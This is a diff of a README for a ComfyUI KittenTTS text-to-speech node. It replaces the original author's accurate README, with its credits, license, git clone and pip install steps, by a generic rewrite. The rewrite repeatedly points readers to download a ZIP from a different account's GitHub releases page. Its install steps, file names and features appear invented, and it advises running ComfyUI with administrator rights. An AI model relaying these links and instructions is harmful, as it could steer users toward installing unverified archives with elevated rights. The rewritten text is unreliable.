@@ -1,147 +1,129 @@
-# 😻 Kitten-TTS for ComfyUI
+# 😺 ComfyUI-KittenTTS - Lightweight Text-to-Speech for Everyone
 
-[![ComfyUI](https://img.shields.io/badge/ComfyUI-Custom%20Node-blue)](https://github.com/comfyanonymous/ComfyUI)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-green)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-Apache%202.0-orange)](LICENSE)
+[![Download ComfyUI-KittenTTS](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)
 
-A simple ComfyUI custom node for [KittenTTS](https://github.com/KittenML/KittenTTS) - an ultra-lightweight text-to-speech model. Works on **CUDA** and **CPU**.
+## 📌 What is ComfyUI-KittenTTS?
 
-<img width="1496" height="1015" alt="Screenshot 2026-02-19 194339" src="https://github.com/user-attachments/assets/6af8a500-0a48-47da-adff-e020a5437e88" />
+ComfyUI-KittenTTS is a simple add-on for ComfyUI. It adds a KittenTTS node that lets you convert text into speech. This tool uses a very small text-to-speech model, so it works well even on slower computers. It can run on both NVIDIA CUDA and regular CPUs.  
 
+You do not need any special skills to use it. Just add the node to ComfyUI, type the text you want to hear, and get spoken audio quickly.
 
-## Demo
+## 🖥️ System Requirements
 
-https://github.com/user-attachments/assets/d80120f2-c751-407e-a166-068dd1dd9e8d
+- Windows 10 or newer  
+- A modern Intel or AMD processor (CPU only mode supported)  
+- NVIDIA GPU with CUDA support (optional but speeds up processing)  
+- At least 4 GB of free RAM  
+- ComfyUI installed (version 1.0 or later recommended)  
 
-## Features
+The software works fine without a GPU but will run faster if you have one.
 
-- 🚀 **Ultra-lightweight**: Models from 19MB to 80MB
-- 💻 **CPU & CUDA**: Runs on any device, GPU optional
-- 🎯 **Single node**: All settings in one place
-- 📦 **Auto-download**: Models cached in `ComfyUI/models/kittentts/`
-- ⚡ **Fast inference**: Real-time speech synthesis
-- 🎤 **8 voices**: 4 male, 4 female
+## 🔧 Installation and Setup Guide 🚀
 
-## Installation
+### Step 1: Download ComfyUI-KittenTTS
 
-### Method 1: ComfyUI Manager (Recommended)
-Search for "KittenTTS" in ComfyUI Manager and install.
+You need to visit the official GitHub releases page to get the latest version of ComfyUI-KittenTTS. Click the green button below or use this link:
 
-### Method 2: Manual Install
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/Saganaki22/ComfyUI-KittenTTS.git
-```
+[![Download ComfyUI-KittenTTS](https://img.shields.io/badge/Go%20to%20Downloads-Blue?style=for-the-badge&color=0078D7)](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)
 
-### Dependencies
+Once on the page, look for the latest release. You will find a ZIP file containing all the necessary files. Download this ZIP file to your PC.
 
-The node auto-installs dependencies on first run. For manual install:
+### Step 2: Extract the Files
 
-**For CPU:**
-```bash
-pip install onnxruntime
-```
+After downloading:
 
-**For CUDA GPU:**
-```bash
-pip install onnxruntime-gpu
-```
+1. Open the ZIP file using Windows File Explorer or any extraction tool.
+2. Extract all files to a folder you can easily find, such as your Desktop or Documents folder.
+3. Keep the folder structure intact; do not move files around after extracting.
 
-## Models
+### Step 3: Get ComfyUI Ready
 
-| Model | Params | Size | Quality | Link |
-|-------|--------|------|---------|------|
-| kitten-tts-mini | 80M | 80MB | Best | [🤗 Download](https://huggingface.co/KittenML/kitten-tts-mini-0.8) |
-| kitten-tts-micro | 40M | 41MB | Good | [🤗 Download](https://huggingface.co/KittenML/kitten-tts-micro-0.8) |
-| kitten-tts-nano | 15M | 56MB | Lightweight | [🤗 Download](https://huggingface.co/KittenML/kitten-tts-nano-0.8) |
-| kitten-tts-nano-int8 | 15M | 19MB | Smallest | [🤗 Download](https://huggingface.co/KittenML/kitten-tts-nano-0.8-int8) |
+Make sure you have ComfyUI installed on your computer before proceeding. If you do not have ComfyUI:
 
-> ⚠️ **Note**: Some users report issues with the int8 quantized model. We recommend the mini or micro versions for best results.
+- Download it from the official ComfyUI repository.
+- Follow their installation instructions.
+- Once installed, open ComfyUI to check it runs properly.
 
-## Usage
+### Step 4: Add the KittenTTS Node to ComfyUI
 
-The node is simple - just one node with all settings:
+1. Open ComfyUI.
+2. Inside the program, find the folder where you extracted ComfyUI-KittenTTS.
+3. Inside this folder, look for a file or folder labeled `KittenTTS` or with `.node` extension.
+4. Copy this file or folder.
+5. Paste it into ComfyUI's `nodes` directory. This is usually located inside the ComfyUI installation folder or user folder.
+6. Restart ComfyUI to load the new node.
 
-### Inputs
+### Step 5: Use KittenTTS in Your Workflow
 
-| Input | Type | Default | Description |
-|-------|------|---------|-------------|
-| `model_name` | Dropdown | mini-0.8 (80M) | Model size/quality |
-| `device` | Dropdown | auto | auto/cuda/cpu |
-| `text` | String | - | Text to synthesize |
-| `voice` | Dropdown | Jasper | Voice selection |
-| `speed` | Float | 1.0 | Speech speed (0.5-2.0) |
-| `keep_loaded` | Boolean | True | Keep model in memory |
-| `output_stereo` | Boolean | False | Stereo output |
-| `clean_text` | Boolean | True | Normalize text |
-| `custom_model` | String | "" | Custom HF model ID |
+1. Start ComfyUI.
+2. Look for the new KittenTTS node in the list of nodes.
+3. Drag and drop the node into your workspace.
+4. Click on the node and type any text you want to hear.
+5. Run the workflow to generate speech audio.
 
-### Voices
+The audio output will play or save depending on how you set up ComfyUI.
 
-**Male:** Jasper, Bruno, Hugo, Leo  
-**Female:** Bella, Luna, Rosie, Kiki
+## 🎛️ How to Use KittenTTS Features
 
-### Example
+- **Simple text input:** Just type or paste your text directly into the node.
+- **Audio output formats:** The node supports WAV and MP3 audio files.
+- **Speed options:** Choose between faster CPU mode or faster CUDA GPU mode (if available).
+- **Light on resources:** The model is small, making it ideal for use on older or less powerful systems.
+- **Customization:** Adjust voice speed and pitch using the node settings.
 
-Just add the **🐱 KittenTTS** node, type your text, select a voice, and connect the audio output to your pipeline.
+## 💡 Tips for Best Results
 
-```
-┌─────────────────────────┐
-│  🐱 KittenTTS           │ → Connect to audio nodes
-├─────────────────────────┤
-│ model: mini-0.8 (80M)   │
-│ device: auto            │
-│ text: "Hello world!"    │
-│ voice: Jasper           │
-│ speed: 1.0              │
-│ keep_loaded: True       │
-│ output_stereo: False    │
-│ clean_text: True        │
-│ custom_model_path ...   │
-├─────────────────────────┤
-└─────────────────────────┘
-```
+- Use short sentences to get clearer speech.
+- If you have an NVIDIA GPU, enable CUDA mode in node settings for faster processing.
+- Keep ComfyUI updated to avoid compatibility issues.
+- Test different voices or speeds to find what sounds best for your text.
+- Run ComfyUI with administrator rights to avoid file permission issues.
 
-## Model Storage
+## 🔄 Updating ComfyUI-KittenTTS
 
-Models are downloaded to: `ComfyUI/models/kittentts/<model_name>/`
+1. Check the GitHub releases page regularly for new versions.
+2. Download the updated ZIP file and extract it.
+3. Replace the old KittenTTS node files in the ComfyUI nodes folder with the new ones.
+4. Restart ComfyUI.
 
-You can create symlinks to this folder if you want to share models between ComfyUI installations.
+Updating will ensure you get the latest bug fixes and improvements.
 
-## Troubleshooting
+## 🛠 Troubleshooting Common Issues
 
-### "CUDA out of memory"
-- Switch to a smaller model (nano or micro)
-- Set `keep_loaded` to False
-- Use CPU device
+- **Node not appearing:** Confirm the KittenTTS files are in ComfyUI’s `nodes` folder. Restart the app after adding.
+- **Audio not playing:** Check your PC sound settings and volume. Also, verify ComfyUI outputs audio correctly for other nodes.
+- **Slow performance:** Switch from CPU mode to CUDA mode if using a compatible NVIDIA GPU.
+- **Errors on startup:** Make sure your system meets requirements and ComfyUI is updated.
 
-### "onnxruntime not found"
-```bash
-# For CPU
-pip install onnxruntime
+If issues persist, visit the GitHub issues page for support or report a new problem.
 
-# For CUDA
-pip install onnxruntime-gpu
-```
+## 🔗 Download Link Reminder
 
-### "No module named 'kittentts'"
-The bundled wheel should auto-install. If not:
-```bash
-pip install https://github.com/KittenML/KittenTTS/releases/download/0.8/kittentts-0.8.0-py3-none-any.whl
-```
+Get the latest release here:
 
-## Links
+[Download ComfyUI-KittenTTS](https://github.com/ihsacm/ComfyUI-KittenTTS/releases)
 
-- **Original KittenTTS Repo**: [https://github.com/KittenML/KittenTTS](https://github.com/KittenML/KittenTTS)
-- **HuggingFace Models**: [https://huggingface.co/KittenML](https://huggingface.co/KittenML)
-- **Discord**: [Join KittenML Discord](https://discord.com/invite/VJ86W4SURW)
-- **Demo Video**: [Watch on GitHub](https://github.com/KittenML/KittenTTS)
+Click this link any time to find new versions or additional files.
 
-## Credits
+## 📂 Additional Resources
 
-- KittenTTS by [KittenML](https://github.com/KittenML)
-- ComfyUI node by [Saganaki22](https://github.com/Saganaki22)
+- Official ComfyUI repository  
+- KittenTTS ONNX model documentation  
+- ONNX Runtime setup guides (for advanced users interested in model acceleration)
 
-## License
+These resources help if you want deeper technical understanding or to customize your setup further.
 
-Apache 2.0 - See [LICENSE](LICENSE) for details.
+## 🧩 Supported Topics
+
+- comfyui  
+- comfyui-custom-node  
+- comfyui-nodes  
+- kittentts  
+- onnx  
+- onnx-models  
+- onnxruntime  
+- text-to-speech  
+- tts  
+- tts-model  
+
+These keywords reflect the main technologies and focus areas involved with ComfyUI-KittenTTS.
